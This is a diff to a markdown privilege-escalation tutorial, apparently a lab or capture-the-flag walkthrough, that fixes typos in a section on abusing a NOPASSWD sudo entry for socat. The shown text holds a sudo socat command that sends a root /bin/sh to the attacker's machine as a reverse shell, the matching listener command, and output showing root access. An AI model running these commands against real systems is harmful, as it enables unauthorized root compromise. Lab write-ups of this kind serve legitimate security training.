@@ -208,9 +208,9 @@ Choose a program from the list and try to gain a root shell, using the instructi
 #### 😍Happy Hacking 😍
 
 # 🔥05: Root Privilegers using Shell Escape Sequences :
-Acording to Previous process we will use :sudo -l and then  check Shell Escape Sequences and check it on GFTobins
+Acording to Previous process we will use :sudo -l and then  check Shell Escape Sequences and check it on GFTOBins
 
-#Step 1:
+# Step 1:
         sudo -l 
 matching Defaults entries for falconfeast on inclusion:
     env_reset, mail_badpass,
@@ -219,7 +219,7 @@ matching Defaults entries for falconfeast on inclusion:
 User falconfeast may run the following commands on inclusion:
     (root) NOPASSWD: /usr/bin/socat
     
-#Step 2: Now check (root) NOPASSWD: /usr/bin/socat in GFTobins and use id 
+# Step 2: Now check (root) NOPASSWD: /usr/bin/socat in GFTobins and use id 
 
 Here , socat is our target Shell Escape which use for connected other machine . For liseting socat we must  upload Reverse Shell on our target Machine
 Like that :
@@ -232,7 +232,7 @@ OR :
     sudo socat tcp-connect:my-machine ip:my-machine port number  exec:/bin/sh,pty,stderr,setsid,sigint,sane
     
     
-#Step 3: After  , complete those steps sucessfully   We must use following command in my  pc :
+# Step 3: After  , complete those steps sucessfully   We must use following command in your  pc :
 
         socat file:`tty`,raw,echo=0 tcp-listen:12345
         
@@ -241,9 +241,9 @@ If we successfully complete all those steps we get root power of target machine 
 
 socat file:`tty`,raw,echo=0 tcp-listen:12345
 /bin/sh: 0: can't access tty; job control turned off
-# id
+#id
 uid=0(root) gid=0(root) groups=0(root)
-# whoami
+#whoami
 root
 
 #### 😍Happy Hacking 😍
